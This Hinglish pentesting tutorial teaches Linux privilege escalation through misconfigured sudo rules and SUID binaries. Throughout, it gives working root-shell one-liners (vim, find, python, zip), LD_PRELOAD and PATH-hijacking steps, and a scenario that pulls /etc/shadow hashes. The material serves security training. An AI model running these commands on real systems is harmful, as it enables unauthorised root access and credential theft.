# **Module 6: Privilege Escalation (Apni Power Badhana)**

## **Topic 1: Sudo ka Fayda Uthana (Exploiting Sudo)**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**Sudo Exploitation:** Sudo misconfigurations ko exploit karke root access lena - privilege escalation ka golden ticket.

### **2. Ye Kya Hai? (What is it?)**
Sudo (Super User Do) wo command hai jo normal users ko temporarily root privileges deta hai. Sudo exploitation matlab misconfigured sudo permissions ko abuse karke permanent root access lena.

**Analogy:** Sochiye aap ek office mein kaam karte hain. Sudo wo temporary master key hai jo aapko boss ke cabin mein jaane deti hai specific kaam ke liye. Agar key ka system weak hai, to aap permanent master key bana sakte hain aur hamesha boss ban sakte hain.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Low-privilege se root access
- Misconfigured sudo rules exploit karna
- GTFOBins techniques use karna
- Privilege escalation ka sabse common vector
- Clean aur reliable method

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko limited user shell mil jaaye
- Initial access ke baad
- Privilege escalation phase mein
- Sudo permissions check karne ke baad

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Sabse common privilege escalation vector miss ho jayega. Root access nahi mil payega. Pentesting incomplete rahegi. Easy wins miss ho jayenge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**Sudo Basics:**
```bash
# Check sudo permissions
sudo -l

# Run command as root
sudo command

# Run command as specific user
sudo -u username command

# Sudo with environment variables
sudo -E command

# Sudo shell
sudo -s
sudo -i
```

**Common Sudo Misconfigurations:**
```bash
# No password required
user ALL=(ALL) NOPASSWD: ALL

# Specific commands
user ALL=(ALL) NOPASSWD: /usr/bin/vim

# Wildcard abuse
user ALL=(ALL) NOPASSWD: /bin/cp *

# Environment variables
user ALL=(ALL) SETENV: /usr/bin/script
```

**GTFOBins Exploitation:**
- Vim: `:!sh` ya `:set shell=/bin/sh` then `:shell`
- Less: `!sh`
- Find: `sudo find . -exec /bin/sh \;`
- Nmap: `sudo nmap --interactive` then `!sh`
- Python: `sudo python -c 'import os; os.system("/bin/sh")'`

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: Sudo permissions check**
```bash
sudo -l
```

**Expected Output:**
```
User john may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Scenario 2: Vim exploitation**
```bash
sudo vim
```

Vim ke andar:
```vim
:!sh
```

| Command Part | Matlab |
|--------------|--------|
| `:!` | Shell command execute |
| `sh` | Shell spawn karo |

**Expected Output:** Root shell mil jayega: `#`

**Scenario 3: Find exploitation**
```bash
sudo find /home -exec /bin/bash \;
```

| Command Part | Matlab |
|--------------|--------|
| `sudo find` | Find command as root |
| `-exec /bin/bash \;` | Execute bash shell |

**Scenario 4: Python exploitation**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Scenario 5: Environment variable abuse**
```bash
sudo -E LD_PRELOAD=/tmp/evil.so command
```

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- `sudo -l` check karna bhoolna
- GTFOBins reference na karna
- NOPASSWD entries miss karna
- Wildcard misconfigurations ignore karna
- Environment variables ko overlook karna

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Hamesha `sudo -l` pehle check karein
- **Stealth Tip:** GTFOBins.github.io bookmark karein - har binary ka exploitation method
- `sudo -l` output ko carefully analyze karein - har line important hai
- Wildcards (`*`) dekh kar path traversal try karein
- `SETENV` permission ho to `LD_PRELOAD` attack try karein

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne web application exploit karke `www-data` user shell li. Usne `sudo -l` chalaya aur dekha ki `/usr/bin/zip` NOPASSWD hai. GTFOBins check kiya: `sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"`. Root shell mil gaya!

Dusre case mein, user ko `sudo vim` permission thi. Pentester ne vim khola, `:!bash` type kiya, aur root shell le liya. Phir usne `/etc/shadow` se password hashes extract kiye.

### **11. Checklist / Chota Recap (TL;DR)**
- `sudo -l` - Permissions check
- GTFOBins.github.io - Exploitation reference
- Common: vim, less, find, nmap, python
- NOPASSWD = Easy win
- Environment variables abuse

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `sudo -l` kya dikhata hai?**
A: Current user ko kaun se commands sudo se run karne ki permission hai, password chahiye ya nahi (NOPASSWD).

**Q2: GTFOBins kya hai?**
A: Ek website jo batati hai ki kaun sa binary kaise exploit ho sakta hai sudo/SUID/capabilities ke saath.

**Q3: Vim se shell kaise spawn karein?**
A: `:!sh` ya `:set shell=/bin/sh` then `:shell`

**Q4: Wildcard (*) exploitation kya hai?**
A: Agar `sudo /bin/cp *` allowed hai, to aap path traversal karke sensitive files copy kar sakte hain.

**Q5: LD_PRELOAD attack kya hai?**
A: Malicious shared library load karke program behavior hijack karna.

### **13. Practice ke liye Task**
1. `sudo -l` - Apne permissions check karein
2. Test VM par user banayein: `sudo useradd -m testuser`
3. Sudoers edit: `sudo visudo` â†’ Add: `testuser ALL=(ALL) NOPASSWD: /usr/bin/vim`
4. `su testuser` switch karein
5. `sudo vim` â†’ `:!bash` â†’ Root shell

**Expected Output:** Root shell mil jayega.

### **14. Extra / Advanced Jaankari (Optional)**
- **Sudo version vulnerabilities:** CVE-2021-3156 (Baron Samedit)
- **Sudo tokens:** `/var/run/sudo/ts/` mein cached credentials
- **Sudo plugins:** Custom plugins exploit ho sakte hain
- **Sudoers wildcards:** `[a-z]*` jaise patterns abuse

### **15. Aakhri Choti Summary (5 lines)**
- Sudo misconfiguration sabse common privesc vector
- `sudo -l` hamesha pehle check karein
- GTFOBins har binary ka exploitation guide
- NOPASSWD entries golden opportunities
- Vim, less, find, python common exploitable binaries

> **Ye Zaroor Yaad Rakhein**
> 1. `sudo -l` privilege escalation ka pehla step
> 2. GTFOBins.github.io bookmark karein
> 3. Vim: `:!sh` instant root shell
> 4. NOPASSWD = No password needed
> 5. Wildcards aur SETENV dangerous hain

---

## **Topic 2: SUID/SGID Binaries ko Exploit karna**

### **1. Topic ka Naam / Ek Line Mein Summary** ðŸš€
**SUID/SGID Exploitation:** Special permission wali files ko abuse karke privilege escalation - hidden gems dhoondhna.

### **2. Ye Kya Hai? (What is it?)**
SUID (Set User ID) aur SGID (Set Group ID) special permissions hain jo file ko hamesha owner/group ki permission se execute karte hain. Agar root-owned SUID binary vulnerable hai, to root shell mil sakta hai.

**Analogy:** SUID ek magic wand hai. Jab aap (normal user) us wand (SUID binary) ko use karte hain, to aap temporarily wizard (root) ban jaate hain. Agar wand mein koi flaw hai, to aap permanently wizard ban sakte hain.

### **3. Pentesting mein Kyun Use Karte Hain? (Why use it?)**
- Root-owned SUID binaries = potential root access
- Misconfigured custom binaries
- Known vulnerable binaries
- Reliable privilege escalation
- No sudo required

### **4. Ise Kab Use Karna Chahiye? (When to use it?)**
- Initial enumeration phase
- Jab sudo permissions na ho
- Custom binaries system par ho
- Standard privilege escalation checks mein

### **5. Agar Ye Pata Nahi Hoga Toh Kya Hoga? (If not known then what?)** ðŸ˜Ÿ
Major privilege escalation vector miss ho jayega. Custom SUID binaries exploit nahi kar payenge. Easy root access opportunities gawa denge.

### **6. Ye Kaise Kaam Karta Hai? / Syntax aur Options**

**SUID/SGID Find Commands:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Writable SUID binaries (jackpot!)
find / -perm -4000 -writable 2>/dev/null
```

**Common Exploitable SUID Binaries:**
```bash
# Find
find . -exec /bin/sh -p \; -quit

# Vim
vim -c ':!sh'

# Nmap (old versions)
nmap --interactive
!sh

# Python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Bash
bash -p

# Less
less /etc/passwd
!sh

# More
more /etc/passwd
!sh
```

**Custom Binary Exploitation:**
- Strings analysis: `strings /path/to/suid`
- Library hijacking: `LD_PRELOAD`
- Path hijacking: Relative paths abuse
- Buffer overflow: Binary exploitation

### **7. Command Example (Poori Explanation ke Saath)**

**Scenario 1: SUID binaries dhoondhna**
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Expected Output:**
```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find
/usr/local/bin/custom_tool
```

**Scenario 2: Find exploitation**
```bash
find . -exec /bin/sh -p \; -quit
```

| Command Part | Matlab |
|--------------|--------|
| `find .` | Current directory search |
| `-exec /bin/sh -p \;` | Shell execute with privileges |
| `-quit` | Immediately quit |

**Expected Output:** Root shell: `# whoami` â†’ `root`

**Scenario 3: Custom binary analysis**
```bash
strings /usr/local/bin/custom_tool | grep -i "system\|exec\|popen"
```

**Agar relative path use kar raha hai:**
```bash
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
/usr/local/bin/custom_tool
```

**Scenario 4: Python SUID**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

| Command Part | Matlab |
|--------------|--------|
| `os.execl` | Execute program |
| `"-p"` | Preserve privileges |

### **8. Beginners ki Aam Galtiyan (Common Mistakes)**
- SUID binaries list ko GTFOBins se match na karna
- Custom binaries ko ignore karna
- `-p` flag bhoolna (privileges preserve nahi honge)
- Writable SUID binaries miss karna
- Strings analysis skip karna

### **9. Best Practices / Pro Tips**
- **CRITICAL Fix:** Hamesha output ko file mein save karein: `find ... > suid.txt`
- **Stealth Tip:** Unusual locations check karein: `/opt`, `/usr/local/bin`, `/home`
- GTFOBins se har binary cross-reference karein
- Custom binaries ko `strings` se analyze karein
- `ltrace` aur `strace` se runtime behavior dekhein

### **10. Asli Pentesting ka Scenario (Real-World Scenario)**
Ek pentester ne SUID scan kiya aur `/usr/local/bin/backup` naam ki custom binary mili. `strings backup` se dekha ki wo `tar` command use kar rahi hai bina full path ke. Usne PATH hijacking ki: malicious `tar` banaya, PATH modify kiya, backup binary run ki, aur root shell le liya.

Dusre case mein, old nmap version SUID tha. Pentester ne `nmap --interactive` chalaya, `!sh` type kiya, aur root shell mil gaya.

### **11. Checklist / Chota Recap (TL;DR)**
- `find / -perm -4000 2>/dev/null` - SUID search
- GTFOBins reference check
- Custom binaries = `strings` analysis
- `-p` flag preserve privileges
- PATH hijacking for relative paths

### **12. Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: SUID aur sudo mein kya fark hai?**
A: SUID file property hai (hamesha owner se run), sudo temporary permission hai (command-specific).

**Q2: `-p` flag kyun zaroori hai?**
A: Bina `-p` ke shell effective UID drop kar deta hai. `-p` se privileges preserve hote hain.

**Q3: Custom SUID binary kaise exploit karein?**
A: `strings` se analyze karein, relative paths dhoondhein, PATH hijacking ya library hijacking try karein.

**Q4: Kya SUID binaries hamesha exploitable hain?**
A: Nahi. Sirf wo jo shell spawn kar sakti hain ya misconfigured hain.

**Q5: SGID kaise exploit hota hai?**
A: Similar to SUID, lekin group privileges ke saath. Agar group ke paas sensitive files access hai to useful.

### **13. Practice ke liye Task**
1. `find / -perm -4000 2>/dev/null | tee suid.txt` - SUID list
2. `cat suid.txt | grep -v "/usr/bin\|/bin"` - Unusual locations
3. Test: `cp /bin/bash /tmp/bash && chmod u+s /tmp/bash`
4. `/tmp/bash -p` - Root shell
5. `whoami` - Verify

**Expected Output:** Root shell mil jayega.

### **14. Extra / Advanced Jaankari (Optional)**
- **Capabilities:** Modern alternative to SUID
- **File capabilities:** `getcap -r / 2>/dev/null`
- **Library hijacking:** `LD_PRELOAD` aur `LD_LIBRARY_PATH`
- **Binary exploitation:** Buffer overflow, format string

### **15. Aakhri Choti Summary (5 lines)**
- SUID binaries owner ki permission se execute hote hain
- Root-owned SUID = potential root access
- GTFOBins har binary ka exploitation method
- Custom binaries `strings` se analyze karein
- `-p` flag privileges preserve karta hai

> **Ye Zaroor Yaad Rakhein**
> 1. `find / -perm -4000` SUID binaries dhoondhta hai
> 2. GTFOBins.github.io essential reference
> 3. Custom binaries = `strings` analysis
> 4. `-p` flag zaroori hai shell spawn mein
> 5. PATH hijacking relative paths ke liye

---

## **Module 6 Takeaway**

Is module mein humne privilege escalation ke do sabse powerful techniques seekhe. Sudo exploitation se misconfigured sudo permissions ko abuse karte hain - `sudo -l` check karna aur GTFOBins use karna essential hai. SUID/SGID binaries se root-owned files ko exploit karte hain - custom binaries ko analyze karna aur PATH hijacking powerful techniques hain. Ye dono methods pentesting mein sabse common aur reliable privilege escalation vectors hain. Practice karte rahein - har system mein kuch na kuch misconfiguration hoti hai.

